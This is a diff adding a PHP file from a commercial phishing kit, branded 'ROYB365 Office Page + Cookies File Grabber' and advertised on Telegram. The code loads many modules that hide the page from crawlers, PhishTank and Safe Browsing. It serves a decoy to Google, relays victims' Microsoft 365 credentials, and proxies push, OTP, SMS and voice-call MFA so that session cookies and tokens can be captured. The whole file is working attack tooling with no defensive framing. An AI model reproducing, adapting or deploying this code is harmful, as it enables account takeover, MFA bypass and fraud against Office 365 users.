@@ -1,0 +1,367 @@
+<?php
+/*
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⠁⠼⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠸⡏⣇⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⢠⡇⢹⣀⠞⠛⢷⡄⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀⠀⠀⣶⣿⣥⡬⡟⠀⠀⠀⣿⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠏⠀⠀⠀⠀⠀⢻⠈⠁⢹⡇⠀⠀⢰⡟⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠶⠛⠛⣻⠅⠀⠀⠀⠀⠀⠀⢸⣆⡴⠟⠃⠀⠀⡾⠁⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⡴⢿⡿⠏⠀⠀⠀⠀⠀⠀⠀⢈⣿⠁⠀⠀⠀⢰⠇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠁⣸⣧⠽⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⢠⡆⣿⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡟⠀⠀⣿⣿⣰⡆⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⣠⣿⡿⣦⣿⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠘⢻⢿⣇⡀⠀⠀⢀⠀⠀⠀⣸⠷⣿⣯⠇⠘⠽⢻⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⢀⣿⠟⠀⠀⢶⣄⠈⠇⣿⣷⠀⠀⠘⣇⠀⠀⠘⣶⠿⠀⠀⠀⠀⠸⣇⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⢀⣾⠏⠀⢰⡀⢸⣿⠃⠲⠃⢻⣶⡄⣦⣿⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢀⣴⣟⣁⣠⣴⣿⡇⢸⡏⠀⠀⠀⠾⢹⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠀⠀⠀⠀⠀
+⣀⣀⣤⣴⣿⣟⠀⠉⣩⣿⡿⢡⡟⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⠀⠀⠀
+⠀⠉⠛⠿⢿⣿⣶⣿⣿⣯⣶⣿⣿⠇⠀⠀⠀⠀⠀⠘⠳⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀
+⠀⠀⠀⠀⠀⣼⣿⣫⠍⠙⠚⠋⣿⢀⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣆⠀⠀⠀⣠⠀⣷⣿⡄⠀⠀
+⠀⠀⠀⠀⣼⡿⣿⡏⣸⠃⠀⠀⢸⡿⣿⡀⢀⠀⠀⠀⠀⠀⠀⠀⢦⣄⠀⠀⣿⡄⠀⢰⣿⣆⣿⠻⣧⠀⠀
+⠀⠀⠀⢰⡟⢠⣿⣿⡯⠀⠀⠀⠀⠳⠸⣧⠈⣷⡀⠰⡄⠀⠀⠀⠈⣿⣇⣰⠟⣷⡄⣸⣿⠻⣿⣇⠛⠀⠀
+⠀⠀⠀⠀⢠⣿⣿⣿⣿⢠⡇⠀⠀⠀⠀⠙⣷⣿⢿⣆⢹⣆⠀⠀⢰⡇⣿⠏⠀⠈⢿⣿⣿⡆⠙⢿⣦⠀⠀
+⠀⠀⠀⠀⢸⣏⣿⢿⣿⡿⠀⠀⠀⠀⠀⠀⠈⠛⠄⠻⢿⡟⢷⣤⣾⠁⠁⠀⠀⠀⠀⠉⠻⣿⡄⡈⠹⣧⠀
+⠀⠀⠀⠀⠈⢸⡏⣸⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠊⠻⣿⡄⠀⠀⠀⠀⠀⠀⠀⠈⡗⠹⣷⣼⡆
+⠀⠀⠀⠀⠀⢸⡃⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠂⠀⠀⠀⠀⠀⠀⠀⠛⠀⣿⡿⣷
+⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠲⠿⠇⠉
+ * //Think Twice , Code Once\\
+ * //We work in the dark to serve the light\\
+ * ROYB365 Office Page + Cookies File Grabber
+ * Version 5
+ * REMEMBER:  
+ * Telegram Channel is : @ROYB365
+ * Telegram Store is   : @ROYB365
+
+ * CopyRights: all reserved https://t.me/office365spammingtoolz
+###########################################
+#$            @ROYB365                   #$
+#$                  Says:                #$
+#$           As the Hunter exist         #$ 
+#$          The victim exist too         #$  
+###########################################
+ ================IF AGREED=================
+ ==================THEN====================
+=To Be save Join Our Telegram Channel
+=   @ROYB365
+=To Be Secured Join Our Telegram Store
+=   @ROYB365
+
+*/
+
+error_reporting(E_ALL ^ E_NOTICE);
+ob_start();
+session_start();
+$path = "../site/";
+require ("../9WOLFConfi/Guration.php");
+require ("../9WOLFConfi/Function.php");
+require ("../9WOLFDecline/AntiBotIp.php");
+require ("../9WOLFDecline/AntiBotPw.php");
+require ("../9WOLFDecline/AntiBotKillBot.php");
+require ("../9WOLFDecline/AntiBotUserAgent.php");
+require ("../9WOLFDecline/AntiBotIsp.php");
+require ("../9WOLFDecline/AnitiBotHost.php");
+require ("../9WOLFDecline/AntiBotPhishTank.php");
+require ("../9WOLFDecline/AntiBotVpn.php");
+require ("../9WOLFDecline/AntiBotProxy.php");
+require ("../9WOLFDecline/AntBotProtection.php");
+require ("../9WOLFDecline/SaveBrowsing.php");
+require ("../9WOLFDecline/DiscoveredBot.php");
+require ("../9WOLFDecline/AntiBotThree.php");
+require ("../9WOLFDecline/DisturbOne.php");
+require ("../9WOLFDecline/DisturbTwo.php");
+require("../9WOLFDecline/Anti/Bot-Crawler.php");
+@require("../9WOLFDecline/Anti/Crawler/src/CrawlerDetect.php");
+use JayBizzle\CrawlerDetect\CrawlerDetect;
+$rand = generateRandomString(130);
+$cage = substr(sha1(mt_rand()),1,25);
+if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { 
+    include($path."index.php"); exit();
+}
+if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {
+    include($path."index.php"); exit();
+}
+
+if (isset($_POST['hidden']) && !empty($_POST['9WOLFDatorKiller'])  ) {
+  include($path."index.php"); exit();
+}
+if (!isset($_SESSION['9WOLF_SESSION_T0k3n'])  ) {
+  include($path."index.php"); exit();
+}
+// if (!isset($_POST['token9WOLFCsrf'])) {
+//   include($path."index.php");
+  
+// }
+// if ($_POST['token9WOLFCsrf'] != $_SESSION['9WOLF_SESSION_T0k3n']) {
+//   include($path."index.php"); 
+// }
+if (isset($_POST['emailaccess'])){
+   $_SESSION['emailaccess']  = $_POST['emailaccess'];
+   }
+
+
+
+
+$WOLFeMail = $_SESSION['emailaccess'];
+$WOLFePass = $_SESSION['emailaccesspass'];
+
+
+$action = $_SESSION['submit'];
+
+if ($action == 'check') {
+
+    $email = $_POST['email'];
+
+    $result = getDetailEmail($email);
+
+    echo json_encode($result);
+
+} else 
+if ($action == 'Sign in') {
+    $login = loginOffice($WOLFeMail, $WOLFePass);
+    $user = $WOLFeMail;
+
+    if ($login['status'] == 'error') {
+
+        header("Location: $priv3?error&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']));
+
+    } else if ($login['status'] == 'success') {
+
+        header("Location: $priv3?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']));
+
+    } else if ($login['status'] == 'verify') {
+
+        header("Location: c4t10n?m4!n&user=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['background']) . "&logo=" . base64_encode($_POST['logo']) . "&token=" . $login['data'] . "&method=" . $login['method'] . "&key=" . $login['key']);
+
+    }
+} else if ($action == 'verify') {
+
+    $token = json_decode(base64_decode($_POST['token']), true);
+
+    $bg = base64_encode($_POST['bg']);
+
+    $logo = base64_encode($_POST['logo']);
+
+    $method = $_POST['method'];
+
+    $user = $_POST['user'];
+
+    $key = $_POST['key'];
+
+
+
+    $redirect = '';
+
+    if ($method == 'PhoneAppNotification') {
+
+        $redirect = 'phoneappnotif';
+
+    } else if ($method == 'PhoneAppOTP') {
+
+        $redirect = 'phoneappotp';
+
+    } else if ($method == 'OneWaySMS') {
+
+        $redirect = 'sms';
+
+    } else if ($method == 'TwoWayVoiceMobile') {
+
+        $redirect = 'twoawaysms';
+
+    }
+
+
+
+    $beginAuth = beginAuthOffice($method, $token['ctx'], $token['flowToken'], $token['canary'], $token['cookie']);
+
+
+
+    if ($beginAuth['Success']) {
+        
+        $token = base64_encode(json_encode([
+
+            'ctx' => $beginAuth['Ctx'],
+
+            'flowToken' => $beginAuth['FlowToken'],
+
+            'cookie' => $token['cookie'],
+
+            'method' => $method,
+            
+            'session' => $beginAuth['SessionId']
+
+        ]));
+
+
+
+        echo json_encode([
+
+            'status' => true,
+
+            'data' => $token,
+
+            'redirect' => "?$redirect&user=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=$bg&logo=$logo&token=$token"
+
+        ]);
+
+    } else {
+
+        echo json_encode(['status' => false, 'message' => 'Verification request failed']);
+
+    }
+
+} else if ($action == 'checkVerify') {
+
+    $user = $WOLFeMail;
+
+    $token = json_decode(base64_decode($_POST['token']), true);
+
+
+
+    if ($_POST['service'] == 'notif') {
+
+        $endAuth = EndAuthOffice($_POST['token']);
+
+        $newToken = base64_encode(json_encode([
+
+            'ctx' => $endAuth['Ctx'],
+
+            'flowToken' => $endAuth['FlowToken'],
+
+            'cookie' => $token['cookie'],
+
+            'method' => $token['method'],
+
+            'session' => $endAuth['SessionId']
+
+        ]));
+
+        if ($endAuth['Success']) {
+
+            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);
+
+
+
+            echo json_encode([
+
+                'status' => true,
+
+                'redirect' => "../index.php?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo'])
+
+            ]);
+
+        } else {
+
+            echo json_encode(['status' => false, 'message' => 'Verification failed', 'token' => $newToken]);
+
+        }
+
+    } else if ($_POST['service'] == 'sms') {
+
+        $endAuth = EndAuthOffice($_POST['token'], $_POST['otc']);
+
+        $newToken = base64_encode(json_encode([
+
+            'ctx' => $endAuth['Ctx'],
+
+            'flowToken' => $endAuth['FlowToken'],
+
+            'cookie' => $token['cookie'],
+
+            'method' => $token['method'],
+
+            'session' => $endAuth['SessionId']
+
+        ]));
+
+        if ($endAuth['Success']) {
+
+            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);
+
+
+
+            header("Location: f1n4l?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']));
+
+        } else {
+
+            header("Location: c4t10n/?sms&user=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']) . "&token=$newToken&error&key=" . $_POST['key']);
+
+        }
+
+    } else if ($_POST['service'] == 'code') {
+
+        $endAuth = EndAuthOffice($_POST['token'], $_POST['otc']);
+
+        $newToken = base64_encode(json_encode([
+
+            'ctx' => $endAuth['Ctx'],
+
+            'flowToken' => $endAuth['FlowToken'],
+
+            'cookie' => $token['cookie'],
+
+            'method' => $token['method'],
+
+            'session' => $endAuth['SessionId']
+
+        ]));
+
+        if ($endAuth['Success']) {
+
+            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);
+
+
+
+            header("Location: index.php?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']));
+
+        } else {
+
+            header("Location: c4t10n/?phoneappotp&user=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo']) . "&token=$newToken&error&key=" . $_POST['key']);
+
+        }
+
+    } else if ($_POST['service'] == 'call') {
+
+        $endAuth = EndAuthOffice($_POST['token'], '');
+
+        $newToken = base64_encode(json_encode([
+
+            'ctx' => $endAuth['Ctx'],
+
+            'flowToken' => $endAuth['FlowToken'],
+
+            'cookie' => $token['cookie'],
+
+            'method' => $token['method'],
+
+            'session' => $endAuth['SessionId']
+
+        ]));
+
+        if ($endAuth['Success']) {
+
+            processAuthOffice($endAuth, $user, $token['cookie'], $_POST['key']);
+
+
+
+            echo json_encode([
+
+                'status' => true,
+
+                'redirect' => "../index.php?success&id=$user&.rand=13InboxLight.aspx&n=1252899642&fid=1&fav=1&bg=" . base64_encode($_POST['bg']) . "&logo=" . base64_encode($_POST['logo'])
+
+            ]);
+
+        } else {
+
+            echo json_encode(['status' => false, 'message' => 'Verification failed', 'token' => $newToken]);
+
+        }
+
+    }
+
+}
+
+
+
+
+?>
